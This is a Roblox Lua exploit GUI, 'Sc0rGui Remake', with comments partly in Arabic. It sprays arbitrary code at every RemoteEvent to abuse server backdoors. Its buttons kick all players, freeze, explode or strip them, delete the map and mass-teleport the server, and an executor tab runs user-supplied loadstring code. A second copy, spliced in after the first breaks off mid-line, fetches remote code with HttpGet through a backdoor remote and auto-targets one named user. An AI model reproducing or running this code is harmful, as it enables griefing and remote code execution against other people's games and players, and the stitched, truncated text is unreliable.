-- [[ Sc0rGui Remake by Sc0rPoin ]] --
local MarketplaceService = game:GetService("MarketplaceService")
local TweenService = game:GetService("TweenService")
local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local UserInputService = game:GetService("UserInputService")
local ContentProvider = game:GetService("ContentProvider")
local LocalPlayer = Players.LocalPlayer
local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Name = "Sc0rGuiRemake"
ScreenGui.ResetOnSpawn = false
local targetParent = nil
if gethui then
targetParent = gethui()
elseif game:GetService("CoreGui"):FindFirstChild("RobloxGui") then
targetParent = game:GetService("CoreGui")
else
targetParent = LocalPlayer:WaitForChild("PlayerGui")
end
ScreenGui.Parent = targetParent
local trueNotifImage = "rbxassetid://136303346026290"
local trueBackgroundImage = "rbxassetid://98678962513453"
local trueLogoImage = "rbxassetid://86574179739113"
local function ShowNotification()
local NotifFrame = Instance.new("Frame")
local NotifCorner = Instance.new("UICorner")
local NotifImage = Instance.new("ImageLabel")
local NotifText = Instance.new("TextLabel")
NotifFrame.Size = UDim2.new(0, 260, 0, 60)
NotifFrame.Position = UDim2.new(1, 30, 1, -100)
NotifFrame.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
NotifFrame.BorderSizePixel = 0
NotifFrame.Parent = ScreenGui
NotifCorner.CornerRadius = UDim.new(0, 4)
NotifCorner.Parent = NotifFrame
NotifImage.Size = UDim2.new(0, 40, 0, 40)
NotifImage.Position = UDim2.new(0, 10, 0, 10)
NotifImage.BackgroundTransparency = 1
NotifImage.Image = trueNotifImage
NotifImage.Parent = NotifFrame
NotifText.Size = UDim2.new(0, 190, 0, 40)
NotifText.Position = UDim2.new(0, 60, 0, 10)
NotifText.BackgroundTransparency = 1
NotifText.Text = "Sc0rGui Remake by Sc0rPoin"
NotifText.TextColor3 = Color3.fromRGB(255, 255, 255)
NotifText.Font = Enum.Font.SourceSansBold
NotifText.TextSize = 14
NotifText.TextXAlignment = Enum.TextXAlignment.Left
NotifText.Parent = NotifFrame
pcall(function() ContentProvider:PreloadAsync({NotifImage}) end)
TweenService:Create(NotifFrame, TweenInfo.new(0.5, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {Position = UDim2.new(1, -280, 1, -100)}):Play()
task.wait(3.5)
TweenService:Create(NotifFrame, TweenInfo.new(0.5, Enum.EasingStyle.Quad, Enum.EasingDirection.In), {Position = UDim2.new(1, 30, 1, -100)}):Play()
task.wait(0.5)
NotifFrame:Destroy()
end
task.spawn(ShowNotification)
local MainFrame = Instance.new("Frame")
local MainStroke = Instance.new("UIStroke")
local BackgroundImage = Instance.new("ImageLabel")
local BlurOverlay = Instance.new("Frame")
MainFrame.Name = "MainFrame"
MainFrame.Size = UDim2.new(0, 520, 0, 280)
MainFrame.Position = UDim2.new(0.5, -260, 0.5, -140)
MainFrame.BackgroundColor3 = Color3.fromRGB(15, 15, 15)
MainFrame.BorderSizePixel = 0
MainFrame.Active = true
MainFrame.Parent = ScreenGui
MainStroke.Thickness = 2
MainStroke.Color = Color3.fromRGB(0, 0, 0)
MainStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
MainStroke.Parent = MainFrame
BackgroundImage.Size = UDim2.new(1, 0, 1, -35)
BackgroundImage.Position = UDim2.new(0, 0, 0, 35)
BackgroundImage.BackgroundTransparency = 1
BackgroundImage.Image = trueBackgroundImage
BackgroundImage.ImageTransparency = 0.55
BackgroundImage.Parent = MainFrame
BlurOverlay.Size = UDim2.new(1, 0, 1, -35)
BlurOverlay.Position = UDim2.new(0, 0, 0, 35)
BlurOverlay.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
BlurOverlay.BackgroundTransparency = 0.4
BlurOverlay.BorderSizePixel = 0
BlurOverlay.ZIndex = BackgroundImage.ZIndex + 1
BlurOverlay.Parent = MainFrame
pcall(function() ContentProvider:PreloadAsync({BackgroundImage}) end)
local TopBar = Instance.new("Frame")
local TopBarStroke = Instance.new("UIStroke")
local LogoImage = Instance.new("ImageLabel")
local TitleLabel = Instance.new("TextLabel")
TopBar.Name = "TopBar"
TopBar.Size = UDim2.new(1, 0, 0, 35)
TopBar.Position = UDim2.new(0, 0, 0, 0)
TopBar.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TopBar.BorderSizePixel = 0
TopBar.ZIndex = 10
TopBar.Parent = MainFrame
TopBarStroke.Thickness = 2
TopBarStroke.Color = Color3.fromRGB(0, 0, 0)
TopBarStroke.Parent = TopBar
LogoImage.Name = "Logo"
LogoImage.Size = UDim2.new(0, 25, 0, 25)
LogoImage.Position = UDim2.new(0, 8, 0, 5)
LogoImage.BackgroundTransparency = 1
LogoImage.Image = trueLogoImage
LogoImage.ZIndex = 11
LogoImage.Parent = TopBar
pcall(function() ContentProvider:PreloadAsync({LogoImage}) end)
TitleLabel.Name = "Title"
TitleLabel.Size = UDim2.new(0, 250, 1, 0)
TitleLabel.Position = UDim2.new(0, 40, 0, 0)
TitleLabel.BackgroundTransparency = 1
TitleLabel.Text = "Sc0rGui Remake by Sc0rPoin"
TitleLabel.TextColor3 = Color3.fromRGB(0, 0, 0)
TitleLabel.Font = Enum.Font.SourceSansBold
TitleLabel.TextSize = 16
TitleLabel.TextXAlignment = Enum.TextXAlignment.Left
TitleLabel.ZIndex = 11
TitleLabel.Parent = TopBar
local CloseButton = Instance.new("TextButton")
CloseButton.Size = UDim2.new(0, 35, 0, 35)
CloseButton.Position = UDim2.new(1, -35, 0, 0)
CloseButton.BackgroundTransparency = 1
CloseButton.Text = "X"
CloseButton.TextColor3 = Color3.fromRGB(0, 0, 0)
CloseButton.Font = Enum.Font.SourceSansBold
CloseButton.TextSize = 16
CloseButton.ZIndex = 11
CloseButton.Parent = TopBar
CloseButton.MouseButton1Click:Connect(function()
ScreenGui:Destroy()
end)
local ToggleButton = Instance.new("ImageButton")
ToggleButton.Name = "ToggleButton"
ToggleButton.Size = UDim2.new(0, 45, 0, 45)
ToggleButton.Position = UDim2.new(0, 10, 0, 10)
ToggleButton.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
ToggleButton.Image = trueLogoImage
ToggleButton.Active = true
ToggleButton.Draggable = true
ToggleButton.Parent = ScreenGui
local ToggleStroke = Instance.new("UIStroke")
ToggleStroke.Thickness = 2
ToggleStroke.Color = Color3.fromRGB(0, 0, 0)
ToggleStroke.Parent = ToggleButton
local ToggleCorner = Instance.new("UICorner")
ToggleCorner.CornerRadius = UDim.new(0, 6)
ToggleCorner.Parent = ToggleButton
ToggleButton.MouseButton1Click:Connect(function()
MainFrame.Visible = not MainFrame.Visible
end)
local dragging, dragInput, dragStart, startPos
local function update(input)
local delta = input.Position - dragStart
MainFrame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
end
TopBar.InputBegan:Connect(function(input)
if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
dragging = true
dragStart = input.Position
startPos = MainFrame.Position
input.Changed:Connect(function()
if input.UserInputState == Enum.UserInputState.End then
dragging = false
end
end)
end
end)
TopBar.InputChanged:Connect(function(input)
if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
dragInput = input
end
end)
UserInputService.InputChanged:Connect(function(input)
if input == dragInput and dragging then
update(input)
end
end)
local SideBar = Instance.new("Frame")
SideBar.Name = "SideBar"
SideBar.Size = UDim2.new(0, 110, 1, -35)
SideBar.Position = UDim2.new(0, 0, 0, 35)
SideBar.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
SideBar.BorderSizePixel = 0
SideBar.ZIndex = 5
SideBar.Parent = MainFrame
local SideStroke = Instance.new("UIStroke")
SideStroke.Thickness = 1
SideStroke.Color = Color3.fromRGB(0, 0, 0)
SideStroke.Parent = SideBar
local TabContainer = Instance.new("Frame")
TabContainer.Size = UDim2.new(1, -110, 1, -35)
TabContainer.Position = UDim2.new(0, 110, 0, 35)
TabContainer.BackgroundTransparency = 1
TabContainer.ZIndex = 5
TabContainer.Parent = MainFrame
local Tabs = {}
local Pages = {}
local function CreateTab(name, order)
local Button = Instance.new("TextButton")
Button.Size = UDim2.new(1, 0, 0, 35)
Button.Position = UDim2.new(0, 0, 0, (order - 1) * 35)
Button.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
Button.BorderSizePixel = 0
Button.Text = name
Button.TextColor3 = Color3.fromRGB(180, 180, 180)
Button.Font = Enum.Font.SourceSansBold
Button.TextSize = 13
Button.ZIndex = 6
Button.Parent = SideBar
local ButtonStroke = Instance.new("UIStroke")
ButtonStroke.Thickness = 1
ButtonStroke.Color = Color3.fromRGB(10, 10, 10)
ButtonStroke.Parent = Button
local Page = Instance.new("ScrollingFrame")
Page.Size = UDim2.new(1, 0, 1, 0)
Page.BackgroundTransparency = 1
Page.Visible = false
Page.CanvasSize = UDim2.new(0, 0, 0, 0)
Page.ScrollBarThickness = 3
Page.ZIndex = 6
Page.Parent = TabContainer
Button.MouseButton1Click:Connect(function()
for _, p in pairs(Pages) do p.Visible = false end
for _, b in pairs(Tabs) do
b.TextColor3 = Color3.fromRGB(180, 180, 180)
b.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
end
Page.Visible = true
Button.TextColor3 = Color3.fromRGB(255, 255, 255)
Button.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
end)
Tabs[name] = Button
Pages[name] = Page
return Page
end
local HomePage = CreateTab("Home", 1)
local ServerPage = CreateTab("Server", 2)
local ExecutorPage = CreateTab("Executor", 3)
local PleyerPage = CreateTab("Player", 3)
Pages["Home"].Visible = true
Tabs["Home"].TextColor3 = Color3.fromRGB(255, 255, 255)
Tabs["Home"].BackgroundColor3 = Color3.fromRGB(35, 35, 35)
local function CreateInfoLabel(text, pos, parent)
local Label = Instance.new("TextLabel")
Label.Size = UDim2.new(1, -20, 0, 25)
Label.Position = pos
Label.BackgroundTransparency = 1
Label.Text = text
Label.TextColor3 = Color3.fromRGB(220, 220, 220)
Label.Font = Enum.Font.SourceSans
Label.TextSize = 14
Label.TextXAlignment = Enum.TextXAlignment.Left
Label.ZIndex = 7
Label.Parent = parent
return Label
end
local accountAgeDays = LocalPlayer.AccountAge
local serverPlayers = #Players:GetPlayers()
CreateInfoLabel("Username: " .. LocalPlayer.Name, UDim2.new(0, 12, 0, 12), HomePage)
CreateInfoLabel("Age Days: " .. tostring(accountAgeDays) .. " days", UDim2.new(0, 12, 0, 42), HomePage)
CreateInfoLabel("Server Players: " .. tostring(serverPlayers) .. " players", UDim2.new(0, 12, 0, 72), HomePage)
CreateInfoLabel("Job ID: " .. game.JobId, UDim2.new(0, 12, 0, 102), HomePage)
CreateInfoLabel("Place ID: " .. tostring(game.PlaceId), UDim2.new(0, 12, 0, 132), HomePage)
local function ExecuteServerCode(stringCode)
for _, v in pairs(game:GetDescendants()) do
if v:IsA("RemoteEvent") then
pcall(function()
v:FireServer(stringCode)
v:FireServer("Execute", stringCode)
end)
end
end
end
local ServerLayout = Instance.new("UIGridLayout")
ServerLayout.CellSize = UDim2.new(0, 120, 0, 30)
ServerLayout.CellPadding = UDim2.new(0, 8, 0, 8)
ServerLayout.SortOrder = Enum.SortOrder.LayoutOrder
ServerLayout.Parent = ServerPage
local ServerPadding = Instance.new("UIPadding")
ServerPadding.PaddingTop = UDim.new(0, 12)
ServerPadding.PaddingLeft = UDim.new(0, 12)
ServerPadding.Parent = ServerPage
local function CreateServerButton(text, onClick)
local Btn = Instance.new("TextButton")
Btn.Size = UDim2.new(0, 120, 0, 30)
Btn.Text = text
Btn.TextColor3 = Color3.fromRGB(255, 255, 255)
Btn.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
Btn.Font = Enum.Font.SourceSansBold
Btn.TextSize = 12
Btn.ZIndex = 7
Btn.Parent = ServerPage
local Stroke = Instance.new("UIStroke")
Stroke.Thickness = 1
Stroke.Color = Color3.fromRGB(0, 0, 0)
Stroke.Parent = Btn
Btn.MouseButton1Click:Connect(onClick)
return Btn
end
CreateServerButton("Decal Spam", function()
ExecuteServerCode([[for _,v in pairs(workspace:GetDescendants()) do if v:IsA("Decal") or v:IsA("Texture") then v.Texture = "rbxassetid://86574179739113" end end]])
end)
CreateServerButton("Set Skybox", function()
ExecuteServerCode([[local s = Instance.new("Sky", game:GetService("Lighting")) s.SkyboxBk = "rbxassetid://86574179739113" s.SkyboxDn = "rbxassetid://86574179739113" s.SkyboxFt = "rbxassetid://86574179739113" s.SkyboxLf = "rbxassetid://86574179739113" s.SkyboxRt = "rbxassetid://86574179739113" s.SkyboxUp = "rbxassetid://86574179739113"]])
end)
CreateServerButton("Particles Spam", function()
ExecuteServerCode([[for _,v in pairs(game.Players:GetPlayers()) do if v.Character and v.Character:FindFirstChild("HumanoidRootPart") then local p = Instance.new("ParticleEmitter", v.Character.HumanoidRootPart) p.Texture = "rbxassetid://86574179739113" end end]])
end)
CreateServerButton("Server Shutdown", function()
ExecuteServerCode([[for _,v in pairs(game.Players:GetPlayers()) do v:Kick("Server Closed by Sc0rPoin") end]])
end)
CreateServerButton("666 Mode", function()
ExecuteServerCode([[game:GetService("Lighting").Ambient = Color3.fromRGB(255, 0, 0) for _,v in pairs(game.Lighting:GetChildren()) do if v:IsA("Sky") then v:Destroy() end end local s = Instance.new("Sky", game:GetService("Lighting")) s.SkyboxBk = "rbxassetid://87496936047554" s.SkyboxDn = "rbxassetid://87496936047554" s.SkyboxFt = "rbxassetid://87496936047554" s.SkyboxLf = "rbxassetid://87496936047554" s.SkyboxRt = "rbxassetid://87496936047554" s.SkyboxUp = "rbxassetid://87496936047554"]])
end)
CreateServerButton("Play Music (27.6s)", function()
ExecuteServerCode([[for _,v in pairs(workspace:GetChildren()) do if v:IsA("Sound") then v:Destroy() end end local s = Instance.new("Sound", workspace) s.SoundId = "rbxassetid://122933134275091" s.Volume = 10 s.Looped = true s:Play() s.TimePosition = 27.6]])
end)
CreateServerButton("Freeze All", function()
ExecuteServerCode([[for _,v in pairs(game.Players:GetPlayers()) do if v.Character then for _,p in pairs(v.Character:GetDescendants()) do if p:IsA("BasePart") then p.Anchored = true end end end end]])
end)
CreateServerButton("Naked All", function()
ExecuteServerCode([[for _,v in pairs(game.Players:GetPlayers()) do if v.Character then for _,c in pairs(v.Character:GetChildren()) do if c:IsA("Shirt") or c:IsA("Pants") or c:IsA("ShirtGraphic") then c:Destroy() end end end end]])
end)
CreateServerButton("Explode All", function()
ExecuteServerCode([[for _,v in pairs(game.Players:GetPlayers()) do if v.Character and v.Character:FindFirstChild("HumanoidRootPart") then local e = Instance.new("Explosion", workspace) e.Position = v.Character.HumanoidRootPart.Position end end]])
end)
CreateServerButton("Blackout Mode", function()
ExecuteServerCode([[game:GetService("Lighting").Ambient = Color3.fromRGB(0, 0, 0) game:GetService("Lighting").ColorShift_Top = Color3.fromRGB(0, 0, 0) game:GetService("Lighting").TimeOfDay = "00:00:00" for _,v in pairs(game.Lighting:GetChildren()) do if v:IsA("Sky") then v:Destroy() end end]])
end)
CreateServerButton("Fire Spam", function()
ExecuteServerCode([[for _,v in pairs(workspace:GetDescendants()) do if v:IsA("BasePart") and math.random(1,10) == 1 then Instance.new("Fire", v) end end]])
end)
CreateServerButton("Mass Delete", function()
task.spawn(function() for _,v in pairs(workspace:GetDescendants()) do if v:IsA("BasePart") and not v:IsAncestorOf(game.Players:GetPlayers()) then v:Destroy() task.wait(0.01) end end end)
end)
CreateServerButton("Send Server Game", function()
ExecuteServerCode([[for _,v in pairs(game.Players:GetPlayers()) do game:GetService("TeleportService"):Teleport(6144888035, v) end]])
end)
local HintDummyFrame = Instance.new("Frame")
HintDummyFrame.Size = UDim2.new(0, 120, 0, 30)
HintDummyFrame.BackgroundTransparency = 1
HintDummyFrame.ZIndex = 7
HintDummyFrame.Parent = ServerPage
local HintInput = Instance.new("TextBox")
HintInput.Size = UDim2.new(0, 248, 0, 30)
HintInput.PlaceholderText = "Custom Hint message..."
HintInput.Text = ""
HintInput.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
HintInput.TextColor3 = Color3.fromRGB(255, 255, 255)
HintInput.Font = Enum.Font.SourceSans
HintInput.TextSize = 12
HintInput.ZIndex = 7
HintInput.Parent = ServerPage
local HintInputStroke = Instance.new("UIStroke")
HintInputStroke.Thickness = 1
HintInputStroke.Color = Color3.fromRGB(0, 0, 0)
HintInputStroke.Parent = HintInput
local HintBtn = Instance.new("TextButton")
HintBtn.Size = UDim2.new(0, 120, 0, 30)
HintBtn.Text = "Send Hint"
HintBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
HintBtn.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
HintBtn.Font = Enum.Font.SourceSansBold
HintBtn.TextSize = 12
HintBtn.ZIndex = 7
HintBtn.Parent = ServerPage
local HintBtnStroke = Instance.new("UIStroke")
HintBtnStroke.Thickness = 1
HintBtnStroke.Color = Color3.fromRGB(0, 0, 0)
HintBtnStroke.Parent = HintBtn
HintBtn.MouseButton1Click:Connect(function()
if HintInput.Text ~= "" then
ExecuteServerCode([[local h = Instance.new("Hint", workspace) h.Text = "]] .. HintInput.Text .. [["]])
end
end)
ServerPage.CanvasSize = UDim2.new(0, 0, 0, 320)
-- [[ قسم الـ Executor الكامل والمطور ]] --

-- إنشاء صندوق إدخال النص للأكواد (يدعم الأسطر المتعددة والأكواد الطويلة)
local ScriptInput = Instance.new("TextBox")
ScriptInput.Size = UDim2.new(1, -24, 0, 140)
ScriptInput.Position = UDim2.new(0, 12, 0, 12)
ScriptInput.PlaceholderText = "-- ضع السكربت أو كود require أو loadstring هنا...\n-- يدعم تشغيل الأكواد العادية والمتقدمة"
ScriptInput.Text = ""
ScriptInput.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
ScriptInput.TextColor3 = Color3.fromRGB(255, 255, 255)
ScriptInput.Font = Enum.Font.Code
ScriptInput.TextSize = 11
ScriptInput.TextXAlignment = Enum.TextXAlignment.Left
ScriptInput.TextYAlignment = Enum.TextYAlignment.Top
ScriptInput.ClearTextOnFocus = false
ScriptInput.MultiLine = true
ScriptInput.ZIndex = 7
ScriptInput.Parent = ExecutorPage

local ScriptInputStroke = Instance.new("UIStroke")
ScriptInputStroke.Thickness = 1
ScriptInputStroke.Color = Color3.fromRGB(35, 35, 35)
ScriptInputStroke.Parent = ScriptInput

-- إنشاء زر التنفيذ الشامل (Execute)
local ExecBtn = Instance.new("TextButton")
ExecBtn.Size = UDim2.new(0, 110, 0, 32)
ExecBtn.Position = UDim2.new(0, 12, 0, 165)
ExecBtn.Text = "تشغيل (Execute)"
ExecBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
ExecBtn.BackgroundColor3 = Color3.fromRGB(30, 120, 30) -- لون أخضر مميز للتنفيذ
ExecBtn.Font = Enum.Font.SourceSansBold
ExecBtn.TextSize = 13
ExecBtn.ZIndex = 7
ExecBtn.Parent = ExecutorPage

local ExecBtnStroke = Instance.new("UIStroke")
ExecBtnStroke.Thickness = 1
ExecBtnStroke.Color = Color3.fromRGB(0, 0, 0)
ExecBtnStroke.Parent = ExecBtn

-- إنشاء زر مسح النص (Clear) لتسهيل العمل
local ClearBtn = Instance.new("TextButton")
ClearBtn.Size = UDim2.new(0, 90, 0, 32)
ClearBtn.Position = UDim2.new(0, 130, 0, 165)
ClearBtn.Text = "مسح الشاشة"
ClearBtn.TextColor3 = Color3.fromRGB(200, 200, 200)
ClearBtn.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
ClearBtn.Font = Enum.Font.SourceSansBold
ClearBtn.TextSize = 13
ClearBtn.ZIndex = 7
ClearBtn.Parent = ExecutorPage

local ClearBtnStroke = Instance.new("UIStroke")
ClearBtnStroke.Thickness = 1
ClearBtnStroke.Color = Color3.fromRGB(0, 0, 0)
ClearBtnStroke.Parent = ClearBtn

-- ربط زر المسح بالوظيفة
ClearBtn.MouseButton1Click:Connect(function()
    ScriptInput.Text = ""
end)

-- ربط زر التنفيذ الشامل بالدالة البرمجية الذكية لتشغيل كل الأنواع
ExecBtn.MouseButton1Click:Connect(function()
    local code = ScriptInput.Text
    if code ~= "" then

        if string.match(code, "^%s*require%s*%(") or string.match(code, "^%s*loadstring%s*%(") then

            ExecuteServerCode(code)
        else
            ExecuteServerCode("loadstring([[" .. code .. "]])()")
        end
    end
end)

-- ضبط حجم التمرير التلقائي لصفحة الـ Executor الجديدة
ExecutorPage.CanvasSize = UDim2.
local MarketplaceService = game:GetService("MarketplaceService")
local TweenService = game:GetService("TweenService")
local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local UserInputService = game:GetService("UserInputService")
local ContentProvider = game:GetService("ContentProvider")
local LocalPlayer = Players.LocalPlayer
local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Name = "Sc0rGuiRemake"
ScreenGui.ResetOnSpawn = false
local targetParent = nil
if gethui then
targetParent = gethui()
elseif game:GetService("CoreGui"):FindFirstChild("RobloxGui") then
targetParent = game:GetService("CoreGui")
else
targetParent = LocalPlayer:WaitForChild("PlayerGui")
end
ScreenGui.Parent = targetParent
local trueNotifImage = "rbxassetid://136303346026290"
local trueBackgroundImage = "rbxassetid://98678962513453"
local trueLogoImage = "rbxassetid://86574179739113"
local function ShowNotification()
local NotifFrame = Instance.new("Frame")
local NotifCorner = Instance.new("UICorner")
local NotifImage = Instance.new("ImageLabel")
local NotifText = Instance.new("TextLabel")
NotifFrame.Size = UDim2.new(0, 260, 0, 60)
NotifFrame.Position = UDim2.new(1, 30, 1, -100)
NotifFrame.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
NotifFrame.BorderSizePixel = 0
NotifFrame.Parent = ScreenGui
NotifCorner.CornerRadius = UDim.new(0, 4)
NotifCorner.Parent = NotifFrame
NotifImage.Size = UDim2.new(0, 40, 0, 40)
NotifImage.Position = UDim2.new(0, 10, 0, 10)
NotifImage.BackgroundTransparency = 1
NotifImage.Image = trueNotifImage
NotifImage.Parent = NotifFrame
NotifText.Size = UDim2.new(0, 190, 0, 40)
NotifText.Position = UDim2.new(0, 60, 0, 10)
NotifText.BackgroundTransparency = 1
NotifText.Text = "Sc0rGui Remake by Sc0rPoin"
NotifText.TextColor3 = Color3.fromRGB(255, 255, 255)
NotifText.Font = Enum.Font.SourceSansBold
NotifText.TextSize = 14
NotifText.TextXAlignment = Enum.TextXAlignment.Left
NotifText.Parent = NotifFrame
pcall(function() ContentProvider:PreloadAsync({NotifImage}) end)
TweenService:Create(NotifFrame, TweenInfo.new(0.5, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {Position = UDim2.new(1, -280, 1, -100)}):Play()
task.wait(3.5)
TweenService:Create(NotifFrame, TweenInfo.new(0.5, Enum.EasingStyle.Quad, Enum.EasingDirection.In), {Position = UDim2.new(1, 30, 1, -100)}):Play()
task.wait(0.5)
NotifFrame:Destroy()
end
task.spawn(ShowNotification)
local MainFrame = Instance.new("Frame")
local MainStroke = Instance.new("UIStroke")
local BackgroundImage = Instance.new("ImageLabel")
local BlurOverlay = Instance.new("Frame")
MainFrame.Name = "MainFrame"
MainFrame.Size = UDim2.new(0, 520, 0, 280)
MainFrame.Position = UDim2.new(0.5, -260, 0.5, -140)
MainFrame.BackgroundColor3 = Color3.fromRGB(15, 15, 15)
MainFrame.BorderSizePixel = 0
MainFrame.Active = true
MainFrame.Parent = ScreenGui
MainStroke.Thickness = 2
MainStroke.Color = Color3.fromRGB(0, 0, 0)
MainStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
MainStroke.Parent = MainFrame
BackgroundImage.Size = UDim2.new(1, 0, 1, -35)
BackgroundImage.Position = UDim2.new(0, 0, 0, 35)
BackgroundImage.BackgroundTransparency = 1
BackgroundImage.Image = trueBackgroundImage
BackgroundImage.ImageTransparency = 0.55
BackgroundImage.Parent = MainFrame
BlurOverlay.Size = UDim2.new(1, 0, 1, -35)
BlurOverlay.Position = UDim2.new(0, 0, 0, 35)
BlurOverlay.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
BlurOverlay.BackgroundTransparency = 0.4
BlurOverlay.BorderSizePixel = 0
BlurOverlay.ZIndex = BackgroundImage.ZIndex + 1
BlurOverlay.Parent = MainFrame
pcall(function() ContentProvider:PreloadAsync({BackgroundImage}) end)
local TopBar = Instance.new("Frame")
local TopBarStroke = Instance.new("UIStroke")
local LogoImage = Instance.new("ImageLabel")
local TitleLabel = Instance.new("TextLabel")
TopBar.Name = "TopBar"
TopBar.Size = UDim2.new(1, 0, 0, 35)
TopBar.Position = UDim2.new(0, 0, 0, 0)
TopBar.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TopBar.BorderSizePixel = 0
TopBar.ZIndex = 10
TopBar.Parent = MainFrame
TopBarStroke.Thickness = 2
TopBarStroke.Color = Color3.fromRGB(0, 0, 0)
TopBarStroke.Parent = TopBar
LogoImage.Name = "Logo"
LogoImage.Size = UDim2.new(0, 25, 0, 25)
LogoImage.Position = UDim2.new(0, 8, 0, 5)
LogoImage.BackgroundTransparency = 1
LogoImage.Image = trueLogoImage
LogoImage.ZIndex = 11
LogoImage.Parent = TopBar
pcall(function() ContentProvider:PreloadAsync({LogoImage}) end)
TitleLabel.Name = "Title"
TitleLabel.Size = UDim2.new(0, 250, 1, 0)
TitleLabel.Position = UDim2.new(0, 40, 0, 0)
TitleLabel.BackgroundTransparency = 1
TitleLabel.Text = "Sc0rGui Remake by Sc0rPoin"
TitleLabel.TextColor3 = Color3.fromRGB(0, 0, 0)
TitleLabel.Font = Enum.Font.SourceSansBold
TitleLabel.TextSize = 16
TitleLabel.TextXAlignment = Enum.TextXAlignment.Left
TitleLabel.ZIndex = 11
TitleLabel.Parent = TopBar
local CloseButton = Instance.new("TextButton")
CloseButton.Name = "CloseButton"
CloseButton.Size = UDim2.new(0, 35, 0, 35)
CloseButton.Position = UDim2.new(1, -35, 0, 0)
CloseButton.BackgroundTransparency = 1
CloseButton.Text = "X"
CloseButton.TextColor3 = Color3.fromRGB(0, 0, 0)
CloseButton.TextSize = 18
CloseButton.Font = Enum.Font.SourceSansBold
CloseButton.ZIndex = 11
CloseButton.Parent = TopBar
CloseButton.MouseButton1Click:Connect(function() ScreenGui:Destroy() end)
local GivePanel = Instance.new("Frame")
local GiveInput = Instance.new("TextBox")
local GiveBtn = Instance.new("TextButton")
local PanelCorner = Instance.new("UICorner")
local InputCorner = Instance.new("UICorner")
local BtnCorner = Instance.new("UICorner")
GivePanel.Name = "GivePanel"
GivePanel.Size = UDim2.new(0, 200, 0, 100)
GivePanel.Position = UDim2.new(1, -210, 0, 45)
GivePanel.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
GivePanel.ZIndex = 12
GivePanel.Parent = MainFrame
PanelCorner.CornerRadius = UDim.new(0, 6)
PanelCorner.Parent = GivePanel
GiveInput.Name = "GiveInput"
GiveInput.Size = UDim2.new(0, 180, 0, 30)
GiveInput.Position = UDim2.new(0, 10, 0, 15)
GiveInput.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
GiveInput.TextColor3 = Color3.fromRGB(255, 255, 255)
GiveInput.PlaceholderText = "اسم اللاعب هنا..."
GiveInput.Text = ""
GiveInput.TextSize = 14
GiveInput.Font = Enum.Font.SourceSans
GiveInput.ZIndex = 13
GiveInput.Parent = GivePanel
InputCorner.CornerRadius = UDim.new(0, 4)
InputCorner.Parent = GiveInput
GiveBtn.Name = "GiveBtn"
GiveBtn.Size = UDim2.new(0, 180, 0, 35)
GiveBtn.Position = UDim2.new(0, 10, 0, 50)
GiveBtn.BackgroundColor3 = Color3.fromRGB(0, 120, 255)
GiveBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
GiveBtn.Text = "اعطيه السكربت"
GiveBtn.Font = Enum.Font.SourceSansBold
GiveBtn.TextSize = 14
GiveBtn.ZIndex = 13
GiveBtn.Parent = GivePanel
BtnCorner.CornerRadius = UDim.new(0, 4)
BtnCorner.Parent = GiveBtn

-- لتسهيل تحديث السكربت لاحقاً، ضع رابط الـ loadstring حقك هنا
local scriptUrl = "https://githubusercontent.com"

local function loadstringToUser(targetName)
    for _, p in pairs(Players:GetPlayers()) do
        if p.Name:lower():sub(1, #targetName) == targetName:lower() then
            -- تشغيل السكربت عن طريق الباكدور عبر السيرفر للاعب المستهدف
            local bdr = game:GetService("ReplicatedStorage"):FindFirstChild("اسم_ريموت_الباكدور_حقك")
            if bdr then
                bdr:FireServer("loadstring(game:HttpGet('"..scriptUrl.."'))()")
            else
                -- إذا لم يتوفر ريموت سيرفر سايد، يتم المحاولة محلياً للاعب في حال كان لديك بيئة تنفيذ مشتركة
                if p == LocalPlayer then
                    loadstring(game:HttpGet(scriptUrl))()
                end
            end
        end
    end
end

GiveBtn.MouseButton1Click:Connect(function()
    if GiveInput.Text ~= "" then
        loadstringToUser(GiveInput.Text)
    end
end)

task.spawn(function()
    local autoUser = "nehmengetout"
    local function checkAndGive(p)
        if p.Name == autoUser then
            p:WaitForChild("PlayerGui", 10)
            loadstringToUser(autoUser)
        end
    end
    for _, p in pairs(Players:GetPlayers()) do checkAndGive(p) end
    Players.PlayerAdded:Connect(checkAndGive)
end)
